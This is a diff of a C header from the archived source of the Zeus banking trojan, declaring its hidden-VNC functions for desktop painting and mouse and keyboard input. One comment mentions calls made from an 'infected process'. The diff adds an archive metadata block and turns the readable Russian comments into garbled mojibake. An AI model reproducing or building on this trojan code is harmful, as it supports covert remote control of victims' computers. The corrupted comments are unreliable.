@@ -1,5 +1,16 @@
 /*
-  Внутринни данные VNC.
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
+/*
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ VNC.
 */
 #pragma once
 
@@ -130,61 +141,61 @@ extern VNCPROCESSDATA vncActiveProcessData;
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Рисование декстопа.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN vncProcessData - VNCPROCESSDATA.
 */
 void paintDesktop(VNCPROCESSDATA *vncProcessData);
 
 /*
-  Рисование окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно для печати.
-  IN visibleRect    - видимая область для окна.
-  IN isServer       - true - функция вызвана с сервера,
-                      false - функция вызвана с зараженного процесса.
+  IN window         - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN visibleRect    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+  IN isServer       - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
-  Return            - true - окно нарисовано/пропущено,
-                      false - окно не нарисовано.
+  Return            - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer);
 
 /*
-  Обработка сообщений мыши.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN vncProcessData - VNCPROCESSDATA.
   IN flags          - Rfb::MOUSEEVENTF_*.
   IN x              - X.
   IN y              - Y.
-  IN data           - допольнительные данные, согласно протоколу RFB.
+  IN data           - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RFB.
 */
 void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data);
 
 /*
-  Обработка сообщений клавиатуры.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN vncProcessData - VNCPROCESSDATA.
   IN keySym         - KeySym.
-  IN down           - true - нажатие, false - отпсукание.
+  IN down           - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down);
 
 /*
-  Обновление состояние кнопок мыши и клавиатуры.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN virtualKey         - клавиша для изменения, 0 - если не чего изменять не нужно.
-  IN down               - true - нажать клавишу, false - отпустить клавишу.
+  IN virtualKey         - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 0 - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN down               - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return                - текущая маска MK_* для мышиных сообщений.
+  Return                - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ MK_* пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down);
 
 /*
-  Выбираем метод рисования окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  IN window - окно.
+  IN window - пїЅпїЅпїЅпїЅ.
 
   Return - PWM_*.
 */
